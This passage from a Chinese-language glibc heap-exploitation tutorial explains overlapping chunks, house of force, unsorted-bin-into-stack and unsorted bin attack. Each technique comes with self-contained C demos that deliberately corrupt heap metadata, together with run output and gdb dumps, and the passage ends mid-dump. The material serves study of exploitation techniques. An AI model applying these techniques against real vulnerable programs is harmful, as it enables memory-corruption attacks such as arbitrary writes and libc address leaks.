p4: 0x1e2b0a0 ~ 0x1e2b8e0
p3: 0x1e2b130 ~ 0x1e2b530

If we memset(p4, 'B', 0xd0), we have:
p4 = BBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAa
p3 = BBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAa

If we memset(p3, 'C', 0x50), we have:
p4 = BBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAa
p3 = CCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAa
```

这个比较简单，就是堆块重叠的问题。通过一个溢出漏洞，改写 unsorted bin 中空闲堆块的 size，改变下一次 malloc 可以返回的堆块大小。

首先分配三个堆块，然后释放掉中间的一个：

```c
gef➤  x/60gx 0x602010-0x10
0x602000:    0x0000000000000000    0x0000000000000091  <-- chunk 1
0x602010:    0x4141414141414141    0x4141414141414141
0x602020:    0x4141414141414141    0x4141414141414141
0x602030:    0x4141414141414141    0x4141414141414141
0x602040:    0x4141414141414141    0x4141414141414141
0x602050:    0x4141414141414141    0x4141414141414141
0x602060:    0x4141414141414141    0x4141414141414141
0x602070:    0x4141414141414141    0x4141414141414141
0x602080:    0x4141414141414141    0x4141414141414141
0x602090:    0x4141414141414141    0x0000000000000091  <-- chunk 2 [be freed]
0x6020a0:    0x00007ffff7dd1b78    0x00007ffff7dd1b78
0x6020b0:    0x4141414141414141    0x4141414141414141
0x6020c0:    0x4141414141414141    0x4141414141414141
0x6020d0:    0x4141414141414141    0x4141414141414141
0x6020e0:    0x4141414141414141    0x4141414141414141
0x6020f0:    0x4141414141414141    0x4141414141414141
0x602100:    0x4141414141414141    0x4141414141414141
0x602110:    0x4141414141414141    0x4141414141414141
0x602120:    0x0000000000000090    0x0000000000000080  <-- chunk 3
0x602130:    0x4141414141414141    0x4141414141414141
0x602140:    0x4141414141414141    0x4141414141414141
0x602150:    0x4141414141414141    0x4141414141414141
0x602160:    0x4141414141414141    0x4141414141414141
0x602170:    0x4141414141414141    0x4141414141414141
0x602180:    0x4141414141414141    0x4141414141414141
0x602190:    0x4141414141414141    0x4141414141414141
0x6021a0:    0x4141414141414141    0x0000000000020e61  <-- top chunk
0x6021b0:    0x0000000000000000    0x0000000000000000
0x6021c0:    0x0000000000000000    0x0000000000000000
0x6021d0:    0x0000000000000000    0x0000000000000000
gef➤  heap bins unsorted
[ Unsorted Bin for arena 'main_arena' ]
[+] unsorted_bins[0]: fw=0x602090, bk=0x602090
 →   Chunk(addr=0x6020a0, size=0x90, flags=PREV_INUSE)
```

chunk 2 被放到了 unsorted bin 中，其 size 值为 0x90。

接下来，假设我们有一个溢出漏洞，可以改写 chunk 2 的 size 值，比如这里我们将其改为 0x111，也就是原本 chunk 2 和 chunk 3 的大小相加，最后一位是 1 表示 chunk 1 是在使用的，其实有没有都无所谓。

```c
gef➤  heap bins unsorted
[ Unsorted Bin for arena 'main_arena' ]
[+] unsorted_bins[0]: fw=0x602090, bk=0x602090
 →   Chunk(addr=0x6020a0, size=0x110, flags=PREV_INUSE)
```

这时 unsorted bin 中的数据也更改了。

接下来 malloc 一个大小的等于 chunk 2 和 chunk 3 之和的 chunk 4，这会将 chunk 2 和 chunk 3 都包含进来：

```c
gef➤  x/60gx 0x602010-0x10
0x602000:    0x0000000000000000    0x0000000000000091  <-- chunk 1
0x602010:    0x4141414141414141    0x4141414141414141
0x602020:    0x4141414141414141    0x4141414141414141
0x602030:    0x4141414141414141    0x4141414141414141
0x602040:    0x4141414141414141    0x4141414141414141
0x602050:    0x4141414141414141    0x4141414141414141
0x602060:    0x4141414141414141    0x4141414141414141
0x602070:    0x4141414141414141    0x4141414141414141
0x602080:    0x4141414141414141    0x4141414141414141
0x602090:    0x4141414141414141    0x0000000000000111  <-- chunk 4
0x6020a0:    0x00007ffff7dd1b78    0x00007ffff7dd1b78
0x6020b0:    0x4141414141414141    0x4141414141414141
0x6020c0:    0x4141414141414141    0x4141414141414141
0x6020d0:    0x4141414141414141    0x4141414141414141
0x6020e0:    0x4141414141414141    0x4141414141414141
0x6020f0:    0x4141414141414141    0x4141414141414141
0x602100:    0x4141414141414141    0x4141414141414141
0x602110:    0x4141414141414141    0x4141414141414141
0x602120:    0x0000000000000090    0x0000000000000080  <-- chunk 3
0x602130:    0x4141414141414141    0x4141414141414141
0x602140:    0x4141414141414141    0x4141414141414141
0x602150:    0x4141414141414141    0x4141414141414141
0x602160:    0x4141414141414141    0x4141414141414141
0x602170:    0x4141414141414141    0x4141414141414141
0x602180:    0x4141414141414141    0x4141414141414141
0x602190:    0x4141414141414141    0x4141414141414141
0x6021a0:    0x4141414141414141    0x0000000000020e61  <-- top chunk
0x6021b0:    0x0000000000000000    0x0000000000000000
0x6021c0:    0x0000000000000000    0x0000000000000000
0x6021d0:    0x0000000000000000    0x0000000000000000
```

这样，相当于 chunk 4 和 chunk 3 就重叠了，两个 chunk 可以互相修改对方的数据。就像上面的运行结果打印出来的那样。



### overlapping_chunks_2

```c
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <stdint.h>
#include <malloc.h>

int main() {
    intptr_t *p1,*p2,*p3,*p4,*p5,*p6;
    unsigned int real_size_p1,real_size_p2,real_size_p3,real_size_p4,real_size_p5,real_size_p6;
    int prev_in_use = 0x1;

    p1 = malloc(0x10);
    p2 = malloc(0x80);
    p3 = malloc(0x80);
    p4 = malloc(0x80);
    p5 = malloc(0x10);
    real_size_p1 = malloc_usable_size(p1);
    real_size_p2 = malloc_usable_size(p2);
    real_size_p3 = malloc_usable_size(p3);
    real_size_p4 = malloc_usable_size(p4);
    real_size_p5 = malloc_usable_size(p5);
    memset(p1, 'A', real_size_p1);
    memset(p2, 'A', real_size_p2);
    memset(p3, 'A', real_size_p3);
    memset(p4, 'A', real_size_p4);
    memset(p5, 'A', real_size_p5);
    fprintf(stderr, "Now we allocate 5 chunks on the heap\n\n");
    fprintf(stderr, "chunk p1: %p ~ %p\n", p1, (unsigned char *)p1+malloc_usable_size(p1));
    fprintf(stderr, "chunk p2: %p ~ %p\n", p2, (unsigned char *)p2+malloc_usable_size(p2));
    fprintf(stderr, "chunk p3: %p ~ %p\n", p3, (unsigned char *)p3+malloc_usable_size(p3));
    fprintf(stderr, "chunk p4: %p ~ %p\n", p4, (unsigned char *)p4+malloc_usable_size(p4));
    fprintf(stderr, "chunk p5: %p ~ %p\n", p5, (unsigned char *)p5+malloc_usable_size(p5));

    free(p4);
    fprintf(stderr, "\nLet's free the chunk p4\n\n");

    fprintf(stderr, "Emulating an overflow that can overwrite the size of chunk p2 with (size of chunk_p2 + size of chunk_p3)\n\n");
    *(unsigned int *)((unsigned char *)p1 + real_size_p1) = real_size_p2 + real_size_p3 + prev_in_use + sizeof(size_t) * 2; // BUG HERE

    free(p2);

    p6 = malloc(0x1b0 - 0x10);
    real_size_p6 = malloc_usable_size(p6);
    fprintf(stderr, "Allocating a new chunk 6: %p ~ %p\n\n", p6, (unsigned char *)p6+real_size_p6);

    fprintf(stderr, "Now p6 and p3 are overlapping, if we memset(p6, 'B', 0xd0)\n");
    fprintf(stderr, "p3 before = %s\n", (char *)p3);
    memset(p6, 'B', 0xd0);
    fprintf(stderr, "p3 after  = %s\n", (char *)p3);
}
$ gcc -g overlapping_chunks_2.c
$ ./a.out
Now we allocate 5 chunks on the heap

chunk p1: 0x18c2010 ~ 0x18c2028
chunk p2: 0x18c2030 ~ 0x18c20b8
chunk p3: 0x18c20c0 ~ 0x18c2148
chunk p4: 0x18c2150 ~ 0x18c21d8
chunk p5: 0x18c21e0 ~ 0x18c21f8

Let's free the chunk p4

Emulating an overflow that can overwrite the size of chunk p2 with (size of chunk_p2 + size of chunk_p3)

Allocating a new chunk 6: 0x18c2030 ~ 0x18c21d8

Now p6 and p3 are overlapping, if we memset(p6, 'B', 0xd0)
p3 before = AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA�
p3 after  = BBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA�
```

同样是堆块重叠的问题，前面那个是在 chunk 已经被 free，加入到了 unsorted bin 之后，再修改其 size 值，然后 malloc 一个不一样的 chunk 出来，而这里是在 free 之前修改 size 值，使 free 错误地修改了下一个 chunk 的 prev_size 值，导致中间的 chunk 强行合并。另外前面那个重叠是相邻堆块之间的，而这里是不相邻堆块之间的。

我们需要五个堆块，假设第 chunk 1 存在溢出，可以改写第二个 chunk 2 的数据，chunk 5 的作用是防止释放 chunk 4 后被合并进 top chunk。所以我们要重叠的区域是 chunk 2 到 chunk 4。首先将 chunk 4 释放掉，注意看 chunk 5 的 prev_size 值：

```c
gef➤  x/70gx 0x602010-0x10
0x602000:    0x0000000000000000    0x0000000000000021  <-- chunk 1
0x602010:    0x4141414141414141    0x4141414141414141
0x602020:    0x4141414141414141    0x0000000000000091  <-- chunk 2
0x602030:    0x4141414141414141    0x4141414141414141
0x602040:    0x4141414141414141    0x4141414141414141
0x602050:    0x4141414141414141    0x4141414141414141
0x602060:    0x4141414141414141    0x4141414141414141
0x602070:    0x4141414141414141    0x4141414141414141
0x602080:    0x4141414141414141    0x4141414141414141
0x602090:    0x4141414141414141    0x4141414141414141
0x6020a0:    0x4141414141414141    0x4141414141414141
0x6020b0:    0x4141414141414141    0x0000000000000091  <-- chunk 3
0x6020c0:    0x4141414141414141    0x4141414141414141
0x6020d0:    0x4141414141414141    0x4141414141414141
0x6020e0:    0x4141414141414141    0x4141414141414141
0x6020f0:    0x4141414141414141    0x4141414141414141
0x602100:    0x4141414141414141    0x4141414141414141
0x602110:    0x4141414141414141    0x4141414141414141
0x602120:    0x4141414141414141    0x4141414141414141
0x602130:    0x4141414141414141    0x4141414141414141
0x602140:    0x4141414141414141    0x0000000000000091  <-- chunk 4 [be freed]
0x602150:    0x00007ffff7dd1b78    0x00007ffff7dd1b78      <-- fd, bk pointer
0x602160:    0x4141414141414141    0x4141414141414141
0x602170:    0x4141414141414141    0x4141414141414141
0x602180:    0x4141414141414141    0x4141414141414141
0x602190:    0x4141414141414141    0x4141414141414141
0x6021a0:    0x4141414141414141    0x4141414141414141
0x6021b0:    0x4141414141414141    0x4141414141414141
0x6021c0:    0x4141414141414141    0x4141414141414141
0x6021d0:    0x0000000000000090    0x0000000000000020  <-- chunk 5 <-- prev_size
0x6021e0:    0x4141414141414141    0x4141414141414141
0x6021f0:    0x4141414141414141    0x0000000000020e11  <-- top chunk
0x602200:    0x0000000000000000    0x0000000000000000
0x602210:    0x0000000000000000    0x0000000000000000
0x602220:    0x0000000000000000    0x0000000000000000
gef➤  heap bins unsorted
[ Unsorted Bin for arena 'main_arena' ]
[+] unsorted_bins[0]: fw=0x602140, bk=0x602140
 →   Chunk(addr=0x602150, size=0x90, flags=PREV_INUSE)
```

free chunk 4 被放入 unsorted bin，大小为 0x90。

接下来是最关键的一步，利用 chunk 1 的溢出漏洞，将 chunk 2 的 size 值修改为 chunk 2 和 chunk 3 的大小之和，即 0x90+0x90+0x1=0x121，最后的 1 是标志位。这样当我们释放 chunk 2 的时候，malloc 根据这个被修改的 size 值，会以为 chunk 2 加上 chunk 3 的区域都是要释放的，然后就错误地修改了 chunk 5 的 prev_size。接着，它发现紧邻的一块 chunk 4 也是 free 状态，就把它俩合并在了一起，组成一个大 free chunk，放进 unsorted bin 中。

```c
gef➤  x/70gx 0x602010-0x10
0x602000:    0x0000000000000000    0x0000000000000021  <-- chunk 1
0x602010:    0x4141414141414141    0x4141414141414141
0x602020:    0x4141414141414141    0x00000000000001b1  <-- chunk 2 [be freed] <-- unsorted bin
0x602030:    0x00007ffff7dd1b78    0x00007ffff7dd1b78      <-- fd, bk pointer
0x602040:    0x4141414141414141    0x4141414141414141
0x602050:    0x4141414141414141    0x4141414141414141
0x602060:    0x4141414141414141    0x4141414141414141
0x602070:    0x4141414141414141    0x4141414141414141
0x602080:    0x4141414141414141    0x4141414141414141
0x602090:    0x4141414141414141    0x4141414141414141
0x6020a0:    0x4141414141414141    0x4141414141414141
0x6020b0:    0x4141414141414141    0x0000000000000091  <-- chunk 3
0x6020c0:    0x4141414141414141    0x4141414141414141
0x6020d0:    0x4141414141414141    0x4141414141414141
0x6020e0:    0x4141414141414141    0x4141414141414141
0x6020f0:    0x4141414141414141    0x4141414141414141
0x602100:    0x4141414141414141    0x4141414141414141
0x602110:    0x4141414141414141    0x4141414141414141
0x602120:    0x4141414141414141    0x4141414141414141
0x602130:    0x4141414141414141    0x4141414141414141
0x602140:    0x4141414141414141    0x0000000000000091  <-- chunk 4 [be freed]
0x602150:    0x00007ffff7dd1b78    0x00007ffff7dd1b78
0x602160:    0x4141414141414141    0x4141414141414141
0x602170:    0x4141414141414141    0x4141414141414141
0x602180:    0x4141414141414141    0x4141414141414141
0x602190:    0x4141414141414141    0x4141414141414141
0x6021a0:    0x4141414141414141    0x4141414141414141
0x6021b0:    0x4141414141414141    0x4141414141414141
0x6021c0:    0x4141414141414141    0x4141414141414141
0x6021d0:    0x00000000000001b0    0x0000000000000020  <-- chunk 5 <-- prev_size
0x6021e0:    0x4141414141414141    0x4141414141414141
0x6021f0:    0x4141414141414141    0x0000000000020e11  <-- top chunk
0x602200:    0x0000000000000000    0x0000000000000000
0x602210:    0x0000000000000000    0x0000000000000000
0x602220:    0x0000000000000000    0x0000000000000000
gef➤  heap bins unsorted
[ Unsorted Bin for arena 'main_arena' ]
[+] unsorted_bins[0]: fw=0x602020, bk=0x602020
 →   Chunk(addr=0x602030, size=0x1b0, flags=PREV_INUSE)
```

现在 unsorted bin 里的 chunk 的大小为 0x1b0，即 0x90*3。咦，所以 chunk 3 虽然是使用状态，但也被强行算在了 free chunk 的空间里了。

最后，如果我们分配一块大小为 0x1b0-0x10 的大空间，返回的堆块即是包括了 chunk 2 + chunk 3 + chunk 4 的大 chunk。这时 chunk 6 和 chunk 3 就重叠了，结果就像上面运行时打印出来的一样。



### house_of_force

在`glibc 2.23`下，通过控制`top chunk`的`size`域为一个特别大的值，导致可以通过`malloc`特别大的值或者负数来将`top chunk`的指针指向任意位置。

```c
#include <stdio.h>
#include <stdint.h>
#include <stdlib.h>
#include <string.h>
#include <stdint.h>
#include <malloc.h>

char bss_var[] = "This is a string that we want to overwrite.";

int main() {
    fprintf(stderr, "We will overwrite a variable at %p\n\n", bss_var);

    intptr_t *p1 = malloc(0x10);
    int real_size = malloc_usable_size(p1);
    memset(p1, 'A', real_size);
    fprintf(stderr, "Let's allocate the first chunk of 0x10 bytes: %p.\n", p1);
    fprintf(stderr, "Real size of our allocated chunk is 0x%x.\n\n", real_size);

    intptr_t *ptr_top = (intptr_t *) ((char *)p1 + real_size);
    fprintf(stderr, "Overwriting the top chunk size with a big value so the malloc will never call mmap.\n");
    fprintf(stderr, "Old size of top chunk: %#llx\n", *((unsigned long long int *)ptr_top));
    ptr_top[0] = -1;
    fprintf(stderr, "New size of top chunk: %#llx\n", *((unsigned long long int *)ptr_top));

    unsigned long evil_size = (unsigned long)bss_var - sizeof(long)*2 - (unsigned long)ptr_top;
    fprintf(stderr, "\nThe value we want to write to at %p, and the top chunk is at %p, so accounting for the header size, we will malloc %#lx bytes.\n", bss_var, ptr_top, evil_size);
    void *new_ptr = malloc(evil_size);
    int real_size_new = malloc_usable_size(new_ptr);
    memset((char *)new_ptr + real_size_new - 0x20, 'A', 0x20);
    fprintf(stderr, "As expected, the new pointer is at the same place as the old top chunk: %p\n", new_ptr);

    void* ctr_chunk = malloc(0x30);
    fprintf(stderr, "malloc(0x30) => %p!\n", ctr_chunk);
    fprintf(stderr, "\nNow, the next chunk we overwrite will point at our target buffer, so we can overwrite the value.\n");

    fprintf(stderr, "old string: %s\n", bss_var);
    strcpy(ctr_chunk, "YEAH!!!");
    fprintf(stderr, "new string: %s\n", bss_var);
}

```

```c
$ gcc -g house_of_force.c
$ ./a.out
We will overwrite a variable at 0x601080

Let's allocate the first chunk of 0x10 bytes: 0x824010.
Real size of our allocated chunk is 0x18.

Overwriting the top chunk size with a big value so the malloc will never call mmap.
Old size of top chunk: 0x20fe1
New size of top chunk: 0xffffffffffffffff

The value we want to write to at 0x601080, and the top chunk is at 0x824028, so accounting for the header size, we will malloc 0xffffffffffddd048 bytes.
As expected, the new pointer is at the same place as the old top chunk: 0x824030
malloc(0x30) => 0x601080!

Now, the next chunk we overwrite will point at our target buffer, so we can overwrite the value.
old string: This is a string that we want to overwrite.
new string: YEAH!!!
```

我们知道在空闲内存的最高处，必然存在一块空闲的 chunk，即 top chunk，当 bins 和 fast bins 都不能满足分配需要的时候，malloc 会从 top chunk 中分出一块内存给用户。

当存在堆溢出漏洞时，可以改写 top chunk 的头部，然后将其改为一个非常大的值（0xffffffffffffffff 即 -1），以确保所有的 malloc 将使用 top chunk 分配，而不会调用 mmap。这时如果攻击者 malloc 一个很大的数目（负有符号整数），top chunk 的位置加上这个大数，造成整数溢出，结果是 top chunk 能够被转移到堆之前的内存地址（如程序的 .bss 段、.data 段、GOT 表等），下次再执行 malloc 时，攻击者就能够控制转移之后地址处的内存。

在计算机中，地址是无符号整数。利用整数溢出，如果我们加一个非常大的数，效果等同于减去一个数，从而让指针“回绕”到低地址

```c
目标地址：bss_var (0x601080)
Top Chunk：0x824028
计算结果：0xffffffffffddd048
当malloc(0xffffffffffddd048)时，通过地址溢出计算，新的chunk起始地址便在0x601080处
```

首先随意分配一个 chunk，此时内存里存在两个 chunk，即 chunk 1 和 top chunk：

```c
gef➤  x/8gx 0x602010-0x10
0x602000:    0x0000000000000000    0x0000000000000021  <-- chunk 1
0x602010:    0x4141414141414141    0x4141414141414141
0x602020:    0x4141414141414141    0x0000000000020fe1  <-- top chunk
0x602030:    0x0000000000000000    0x0000000000000000
```

chunk 1 真实可用的内存有 0x18 字节。

假设 chunk 1 存在溢出，利用该漏洞我们现在将 top chunk 的 size 值改为一个非常大的数：-1

```c
gef➤  x/8gx 0x602010-0x10
0x602000:    0x0000000000000000    0x0000000000000021  <-- chunk 1
0x602010:    0x4141414141414141    0x4141414141414141
0x602020:    0x4141414141414141    0xffffffffffffffff  <-- modified top chunk
0x602030:    0x0000000000000000    0x0000000000000000
```

改写之后的 size==0xffffffffffffffff

现在我们可以 malloc 一个任意大小的内存而不用调用 mmap 了。接下来 malloc 一个 chunk，使得该 chunk 刚好分配到我们想要控制的那块区域为止，这样的话，topchunk就被我们修改到目标区域了，在下一次 malloc 时，就可以返回到我们想要控制的区域了。计算方法是用**目标地址减去 top chunk 地址，再减去 chunk 头的大小**

```c
gef➤  x/8gx 0x602010-0x10
0x602000:    0x0000000000000000    0x0000000000000021
0x602010:    0x4141414141414141    0x4141414141414141
0x602020:    0x4141414141414141    0xfffffffffffff051
0x602030:    0x0000000000000000    0x0000000000000000
gef➤  x/12gx 0x602010+0xfffffffffffff050
0x601060:    0x4141414141414141    0x4141414141414141
0x601070:    0x4141414141414141    0x0000000000000fa9  <-- top chunk
0x601080 <bss_var>:    0x2073692073696854    0x676e697274732061  <-- target
0x601090 <bss_var+16>:    0x6577207461687420    0x6f7420746e617720
0x6010a0 <bss_var+32>:    0x6972777265766f20    0x00000000002e6574
0x6010b0:    0x0000000000000000    0x0000000000000000
```

再次 malloc，将目标地址包含进来即可，现在我们就成功控制了目标内存：

```c
gef➤  x/12gx 0x602010+0xfffffffffffff050
0x601060:    0x4141414141414141    0x4141414141414141
0x601070:    0x4141414141414141    0x0000000000000041  <-- chunk 2
0x601080 <bss_var>:    0x2073692073696854    0x676e697274732061  <-- target
0x601090 <bss_var+16>:    0x6577207461687420    0x6f7420746e617720
0x6010a0 <bss_var+32>:    0x6972777265766f20    0x00000000002e6574
0x6010b0:    0x0000000000000000    0x0000000000000f69  <-- top chunk
```

### unsorted_bin_into_stack

```c
#include <stdio.h>
#include <stdlib.h>

int main() {
    unsigned long stack_buf[4] = {0};

    unsigned long *victim  = malloc(0x80);
    unsigned long *p1 = malloc(0x10);
    fprintf(stderr, "Allocating the victim chunk at %p\n", victim);

    // deal with tcache
    // int *k[10], i;
    // for (i = 0; i < 7; i++) {
    //     k[i] = malloc(0x80);
    // }
    // for (i = 0; i < 7; i++) {
    //     free(k[i]);
    // }

    free(victim);
    fprintf(stderr, "Freeing the chunk, it will be inserted in the unsorted bin\n\n");

    stack_buf[1] = 0x100 + 0x10;
    stack_buf[3] = (unsigned long)stack_buf;        // or any other writable address
    fprintf(stderr, "Create a fake chunk on the stack\n");
    fprintf(stderr, "fake->size: %p\n", (void *)stack_buf[1]);
    fprintf(stderr, "fake->bk: %p\n\n", (void *)stack_buf[3]);

    victim[1] = (unsigned long)stack_buf;
    fprintf(stderr, "Now we overwrite the victim->bk pointer to stack: %p\n\n", stack_buf);

    fprintf(stderr, "Malloc a chunk which size is 0x110 will return the region of our fake chunk: %p\n", &stack_buf[2]);

    unsigned long *fake = malloc(0x100);
    fprintf(stderr, "malloc(0x100): %p\n", fake);
}
```

```c
$ gcc -g unsorted_bin_into_stack.c
$ ./a.out
Allocating the victim chunk at 0x17a1010
Freeing the chunk, it will be inserted in the unsorted bin

Create a fake chunk on the stack
fake->size: 0x110
fake->bk: 0x7fffcd906480

Now we overwrite the victim->bk pointer to stack: 0x7fffcd906480

Malloc a chunk which size is 0x110 will return the region of our fake chunk: 0x7fffcd906490
malloc(0x100): 0x7fffcd906490
```

unsorted-bin-into-stack 通过改写 unsorted bin 里 chunk 的 bk 指针到任意地址，从而在栈上 malloc 出 chunk。

首先将一个 chunk 放入 unsorted bin，并且在栈上伪造一个 chunk：

```c
gdb-peda$ x/6gx victim - 2
0x602000:    0x0000000000000000    0x0000000000000091  <-- victim chunk
0x602010:    0x00007ffff7dd1b78    0x00007ffff7dd1b78
0x602020:    0x0000000000000000    0x0000000000000000
gdb-peda$ x/4gx stack_buf
0x7fffffffdbc0:    0x0000000000000000    0x0000000000000110  <-- fake chunk
0x7fffffffdbd0:    0x0000000000000000    0x00007fffffffdbc0
```

然后假设有一个漏洞，可以改写 victim chunk 的 bk 指针，那么将其改为指向 fake chunk：

```c
gdb-peda$ x/6gx victim - 2
0x602000:    0x0000000000000000    0x0000000000000091  <-- victim chunk
0x602010:    0x00007ffff7dd1b78    0x00007fffffffdbc0    <-- bk pointer
0x602020:    0x0000000000000000    0x0000000000000000
gdb-peda$ x/4gx stack_buf
0x7fffffffdbc0:    0x0000000000000000    0x0000000000000110  <-- fake chunk
0x7fffffffdbd0:    0x0000000000000000    0x00007fffffffdbc0
```

那么此时就相当于 fake chunk 已经被链接到 unsorted bin 中。在下一次 malloc 的时候，malloc 会顺着 bk 指针进行遍历，于是就找到了大小正好合适的 fake chunk：

```c
gdb-peda$ x/6gx victim - 2
0x602000:    0x0000000000000000    0x0000000000000091  <-- victim chunk
0x602010:    0x00007ffff7dd1bf8    0x00007ffff7dd1bf8
0x602020:    0x0000000000000000    0x0000000000000000
gdb-peda$ x/4gx fake - 2
0x7fffffffdbc0:    0x0000000000000000    0x0000000000000110  <-- fake chunk
0x7fffffffdbd0:    0x00007ffff7dd1b78    0x00007fffffffdbc0
```

fake chunk 被取出，而 victim chunk 被从 unsorted bin 中取出来放到了 small bin 中。另外值得注意的是 fake chunk 的 fd 指针被修改了，这是 unsorted bin 的地址，通过它可以泄露 libc 地址

而在libc 2.27中，我们应该伪造fake chunk的bk指向自己，因为libc 2.27添加的Tcache机制会尝试将 Unsorted Bin 中所有同大小的 chunk 都“捞”出来，填满 Tcache，直到 Tcache 满或者 Unsorted Bin 遍历完，只有填满后，才会把最后一个取出来的 chunk 返回给用户。

因此我们将fake chunk的bk指向自己，Tcache会将fake chunk循环填满自己



### unsorted_bin_attack

#### leak

首先关于unsorted bin的leak，我们以拥有两个chunk的unsorted bin为例：

![img](https://ctf-wiki.org/pwn/linux/user-mode/heap/ptmalloc2/figure/gdb-debug-state.png)

我们可以看到，在该链表中必有一个节点（不准确的说，是尾节点，这个就意会一下把，毕竟循环链表实际上没有头尾）的 `fd` 指针会指向 `main_arena` 结构体内部，通过main_arena可以泄露libc，同时如果有多个chunk，则可以泄露出heap地址

```c
main_arena_offset = ELF("libc.so.6").symbols["__malloc_hook"] + 0x10
```

![img](https://ctf-wiki.org/pwn/linux/user-mode/heap/ptmalloc2/figure/unsorted_bin_attack_order.png)

```c
#include <stdio.h>
#include <stdlib.h>

int main() {
    unsigned long stack_var = 0;
    fprintf(stderr, "The target we want to rewrite on stack: %p -> %ld\n\n", &stack_var, stack_var);

    unsigned long *p  = malloc(0x80);
    unsigned long *p1 = malloc(0x10);
    fprintf(stderr, "Now, we allocate first small chunk on the heap at: %p\n",p);

    free(p);
    fprintf(stderr, "We free the first chunk now. Its bk pointer point to %p\n", (void*)p[1]);

    p[1] = (unsigned long)(&stack_var - 2);
    fprintf(stderr, "We write it with the target address-0x10: %p\n\n", (void*)p[1]);

    malloc(0x80);
    fprintf(stderr, "Let's malloc again to get the chunk we just free: %p -> %p\n", &stack_var, (void*)stack_var);

```

```c
$ gcc -g unsorted_bin_attack.c
$ ./a.out
The target we want to rewrite on stack: 0x7ffc9b1d61b0 -> 0

Now, we allocate first small chunk on the heap at: 0x1066010
We free the first chunk now. Its bk pointer point to 0x7f2404cf5b78
We write it with the target address-0x10: 0x7ffc9b1d61a0

Let's malloc again to get the chunk we just free: 0x7ffc9b1d61b0 -> 0x7f2404cf5b78
```

unsorted bin 攻击通常是为更进一步的攻击做准备的，我们知道 unsorted bin 是一个双向链表，在分配时会通过 unlink 操作将 chunk 从链表中移除，所以如果能够控制 unsorted bin chunk 的 bk 指针，就可以向任意位置写入一个指针。这里通过 unlink 将 libc 的信息写入到我们可控的内存中，从而导致信息泄漏，为进一步的攻击提供便利。

unlink 的对 unsorted bin 的操作是这样的：

```c
          /* remove from unsorted list */
          unsorted_chunks (av)->bk = bck;
          bck->fd = unsorted_chunks (av);
```

其中 `bck = victim->bk`

攻击点就在第 2 步：`bck->fd = unsorted_chunks(av);`

如果我们能控制 `victim->bk`（即 `bck`），我们就能让 `bck->fd` 指向任意地址。 glibc 会把 `unsorted_chunks(av)` 的地址（一个很大的 libc 地址）写到 `bck->fd` 所在的位置。

首先分配两个 chunk，然后释放掉第一个，它将被加入到 unsorted bin 中：

```c
gef➤  x/26gx 0x602010-0x10
0x602000:    0x0000000000000000    0x0000000000000091  <-- chunk 1 [be freed]
0x602010:    0x00007ffff7dd1b78    0x00007ffff7dd1b78      <-- fd, bk pointer
0x602020:    0x0000000000000000    0x0000000000000000
0x602030:    0x0000000000000000    0x0000000000000000
0x602040:    0x0000000000000000    0x0000000000000000
0x602050:    0x0000000000000000    0x0000000000000000
0x602060:    0x0000000000000000    0x0000000000000000
0x602070:    0x0000000000000000    0x0000000000000000
0x602080:    0x0000000000000000    0x0000000000000000
0x602090:    0x0000000000000090    0x0000000000000020  <-- chunk 2
0x6020a0:    0x0000000000000000    0x0000000000000000
0x6020b0:    0x0000000000000000    0x0000000000020f51  <-- top chunk
0x6020c0:    0x0000000000000000    0x0000000000000000
gef➤  x/4gx &stack_var-2
0x7fffffffdc50:    0x00007fffffffdd60    0x0000000000400712
0x7fffffffdc60:    0x0000000000000000    0x0000000000602010
gef➤  heap bins unsorted
[ Unsorted Bin for arena 'main_arena' ]
[+] unsorted_bins[0]: fw=0x602000, bk=0x602000
 →   Chunk(addr=0x602010, size=0x90, flags=PREV_INUSE)
```

然后假设存在一个溢出漏洞，可以让我们修改 chunk 1 的数据。然后我们将 chunk 1 的 bk 指针修改为指向目标地址 - 2，也就相当于是在目标地址处有一个 fake free chunk，然后 malloc：

```c
gef➤  x/26gx 0x602010-0x10
0x602000:    0x0000000000000000    0x0000000000000091  <-- chunk 3
0x602010:    0x00007ffff7dd1b78    0x00007fffffffdc50
0x602020:    0x0000000000000000    0x0000000000000000
0x602030:    0x0000000000000000    0x0000000000000000
0x602040:    0x0000000000000000    0x0000000000000000
0x602050:    0x0000000000000000    0x0000000000000000
0x602060:    0x0000000000000000    0x0000000000000000
0x602070:    0x0000000000000000    0x0000000000000000
0x602080:    0x0000000000000000    0x0000000000000000
0x602090:    0x0000000000000090    0x0000000000000021  <-- chunk 2
0x6020a0:    0x0000000000000000    0x0000000000000000
